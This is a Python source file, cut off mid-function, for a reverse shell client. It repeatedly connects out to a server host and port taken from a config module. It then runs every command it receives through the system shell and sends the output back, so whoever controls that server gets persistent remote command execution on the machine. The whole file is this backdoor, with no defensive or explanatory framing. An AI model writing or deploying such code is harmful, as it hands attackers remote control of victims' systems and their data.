import socket
import os
import sys
import time
import traceback
import threading
import subprocess
import logging

from config import *

logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s %(levelname)s %(message)s',
                    filename=LOG_FILE,
                    filemode='w')

def run_command(command):
    try:
        return subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        return e.output

def run_forever():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_HOST, SERVER_PORT))
            while True:
                command = s.recv(1024)
                if not command:
                    break
                else:
                    command_result = run_command(command)
                    s.send(command_result.encode('utf-8'))
            s.close()
        except Exception as e:

